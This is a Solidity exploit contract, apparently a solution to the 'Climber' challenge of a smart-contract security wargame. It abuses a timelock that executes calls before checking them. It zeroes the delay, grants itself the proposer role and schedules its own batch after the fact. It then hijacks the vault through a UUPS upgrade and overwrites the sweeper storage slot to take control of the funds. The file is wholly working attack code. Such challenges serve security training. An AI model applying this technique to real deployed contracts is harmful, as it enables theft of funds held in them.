// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";
import "../climber/ClimberTimelock.sol";
import {PROPOSER_ROLE} from "../climber/ClimberConstants.sol";

contract ClimberVaultAttacker is ClimberVault {
    address private attacker;
    ClimberTimelock climberTimelock;
    ClimberVault climberVault;

    address[] targets = new address[](3);
    uint256[] values = new uint256[](3);
    bytes[] dataElements = new bytes[](3);

    constructor(ClimberTimelock _climberTimelock, ClimberVault _climberVault) {
        attacker = msg.sender;
        climberTimelock = _climberTimelock;
        climberVault = _climberVault;
    }

    function reinitialize(address newSweeper) external reinitializer(2) {
        uint slot;
        assembly {
            slot:= attacker.slot
        }
        
        slot -= 1; // sweeper storage slot
        assembly {
            sstore(slot, newSweeper)
        }
    }

    function attack() external {
        {
        // reset delay, act the PROPOSER_ROLE, and then call schedule to bypass the ReadyForExecution checking
        targets[0] = address(climberTimelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        targets[1] = address(climberTimelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));

        targets[2] = address(address(this));
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(ClimberVaultAttacker.schedule.selector);

        climberTimelock.execute(targets, values, dataElements, 0);
        }

        bytes memory reinitializerData = abi.encodeWithSelector(ClimberVaultAttacker.reinitialize.selector, attacker);
        bytes memory upgradeToAndCallData = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, address(this), reinitializerData);
       
        address[] memory target = new address[](1);
        uint256[] memory value = new uint256[](1);
        bytes[] memory dataElement = new bytes[](1);
        target[0] = address(climberVault);
        value[0] = 0;
        dataElement[0] = upgradeToAndCallData;
        climberTimelock.schedule(target, value, dataElement, 0);
        climberTimelock.execute(target, value, dataElement, 0);
    }

    function schedule() external {
        require(msg.sender == address(climberTimelock), "permission denied!");
        climberTimelock.schedule(targets, values, dataElements, 0);
    }

    receive() external payable {}
}